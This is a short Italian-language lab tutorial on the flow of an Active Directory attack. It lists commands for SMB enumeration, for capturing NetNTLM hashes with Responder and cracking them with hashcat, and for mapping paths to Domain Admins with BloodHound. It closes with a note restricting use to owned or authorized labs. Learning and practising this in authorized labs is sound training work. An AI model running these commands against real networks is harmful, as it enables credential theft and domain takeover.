# Scenario guidato: introduzione all'attacco Active Directory

Obiettivo: capire il flusso di un attacco AD (in laboratorio autorizzato).

## 1. Enumerazione SMB
```
netexec smb 10.0.0.0/24
enum4linux-ng 10.0.0.5
smbmap -H 10.0.0.5
```

## 2. Cattura credenziali (rete autorizzata)
```
sudo responder -I eth0
# gli hash NetNTLM finiscono in /usr/share/responder/logs
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## 3. Mappa i percorsi di attacco con BloodHound
```
bloodhound-python -u utente -p password -d dominio.local -c all -ns 10.0.0.5
sudo neo4j start && bloodhound
```
Importa i .json e usa "Shortest Path to Domain Admins".

## Nota legale
Esegui SOLO in laboratori tuoi (es. GOAD, una AD di test) o autorizzati.
